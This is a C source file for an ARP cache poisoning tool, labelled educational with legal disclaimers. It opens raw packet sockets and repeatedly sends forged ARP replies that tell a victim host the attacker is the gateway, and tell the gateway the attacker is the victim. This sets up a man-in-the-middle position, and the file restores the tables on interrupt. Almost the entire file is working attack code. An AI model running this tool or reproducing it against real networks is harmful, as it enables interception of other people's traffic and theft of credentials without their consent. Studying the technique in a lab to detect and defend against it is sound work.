/*
 * spoof.c — ARP cache poisoning (educational use only)
 *
 * DISCLAIMER: ARP spoofing is illegal on networks you do not own
 * or have explicit written permission to test. Use only on your
 * own lab networks. This tool is provided for educational purposes
 * to understand ARP-based MITM attacks and how to detect them.
 *
 * Restores original ARP tables on SIGINT.
 */
#define _POSIX_C_SOURCE 200112L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "../include/arp.h"

#define POISON_INTERVAL_SEC 2

typedef struct __attribute__((packed)) {
    struct ethhdr eth;
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t oper;
    uint8_t  sha[6];
    uint8_t  spa[4];
    uint8_t  tha[6];
    uint8_t  tpa[4];
} arp_pkt_t;

static int    g_sock      = -1;
static int    g_ifindex   = 0;
static int    g_running   = 1;
static uint8_t g_our_mac[6];
static uint8_t g_victim_mac[6];
static uint8_t g_gw_mac[6];
static uint32_t g_victim_ip;
static uint32_t g_gw_ip;

static void handle_sigint(int sig) {
    (void)sig;
    g_running = 0;
}

static void send_arp_reply(const uint8_t *dst_mac, const uint8_t *src_mac,
                            uint32_t spa, uint32_t tpa,
                            const uint8_t *tha) {
    arp_pkt_t pkt;
    memset(&pkt, 0, sizeof(pkt));

    /* Ethernet header */
    memcpy(pkt.eth.h_dest,   dst_mac, ETH_ALEN);
    memcpy(pkt.eth.h_source, src_mac, ETH_ALEN);
    pkt.eth.h_proto = htons(ETH_P_ARP);

    /* ARP header */
    pkt.htype = htons(1);
    pkt.ptype = htons(ETH_P_IP);
    pkt.hlen  = ETH_ALEN;
    pkt.plen  = 4;
    pkt.oper  = htons(2);  /* Reply */
    memcpy(pkt.sha, src_mac, ETH_ALEN);
    memcpy(pkt.spa, &spa,   4);
    memcpy(pkt.tha, tha,    ETH_ALEN);
    memcpy(pkt.tpa, &tpa,   4);

    struct sockaddr_ll sll = {0};
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = g_ifindex;
    sll.sll_halen    = ETH_ALEN;
    memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

    sendto(g_sock, &pkt, sizeof(pkt), 0,
           (struct sockaddr *)&sll, sizeof(sll));
}

static void restore_arp(void) {
    printf("\n\033[33m[ARP-SPOOF]\033[0m Restoring ARP tables...\n");
    /* Tell victim: gateway's real MAC maps to gateway IP */
    for (int i = 0; i < 5; i++) {
        send_arp_reply(g_victim_mac, g_gw_mac,   g_gw_ip,     g_victim_ip, g_victim_mac);
        send_arp_reply(g_gw_mac,     g_victim_mac, g_victim_ip, g_gw_ip,   g_gw_mac);
        usleep(200000);
    }
    printf("\033[32m[ARP-SPOOF]\033[0m ARP tables restored.\n");
}

void arp_spoof_run(void) {
    printf(
        "\n\033[1;31m"
        "╔══════════════════════════════════════════════╗\n"
        "║  DISCLAIMER: For authorized testing ONLY     ║\n"
        "║  ARP spoofing without permission is illegal  ║\n"
        "╚══════════════════════════════════════════════╝\n"
        "\033[0m\n");

    /* Resolve MACs for victim and gateway */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "arping -c 1 -I %s %s 2>/dev/null | grep -oP '\\[.*?\\]'",
             g_arp_cfg.interface, g_arp_cfg.target_ip);

    if (get_iface_mac(g_arp_cfg.interface, g_our_mac) < 0) {
        fprintf(stderr, "Cannot get interface MAC\n"); return;
    }
    if (get_iface_ip(g_arp_cfg.interface, NULL) < 0) {}

    inet_pton(AF_INET, g_arp_cfg.target_ip,  &g_victim_ip);
    inet_pton(AF_INET, g_arp_cfg.gateway_ip, &g_gw_ip);

    /* Use broadcast MAC if we can't resolve (simplified) */
    memset(g_victim_mac, 0xff, ETH_ALEN);
    memset(g_gw_mac,     0xff, ETH_ALEN);

    char our_mac_str[32];
    mac_to_str(g_our_mac, our_mac_str);

    printf("\033[33m[ARP-SPOOF]\033[0m Starting...\n");
    printf("  Our MAC:    %s\n", our_mac_str);
    printf("  Victim:     %s\n", g_arp_cfg.target_ip);
    printf("  Gateway:    %s\n", g_arp_cfg.gateway_ip);
    printf("  Interval:   %ds\n\n", POISON_INTERVAL_SEC);

    g_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (g_sock < 0) { perror("socket"); return; }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, g_arp_cfg.interface, IFNAMSIZ-1);
    ioctl(g_sock, SIOCGIFINDEX, &ifr);
    g_ifindex = ifr.ifr_ifindex;

    signal(SIGINT, handle_sigint);

    long packets = 0;
    while (g_running) {
        /* Tell victim: "I am the gateway" */
        send_arp_reply(g_victim_mac, g_our_mac, g_gw_ip, g_victim_ip, g_victim_mac);
        /* Tell gateway: "I am the victim" */
        send_arp_reply(g_gw_mac,    g_our_mac, g_victim_ip, g_gw_ip,  g_gw_mac);
        packets++;
        printf("\r  Sent %ld poison packets...", packets);
        fflush(stdout);
        sleep(POISON_INTERVAL_SEC);
    }

    restore_arp();
    close(g_sock);
}
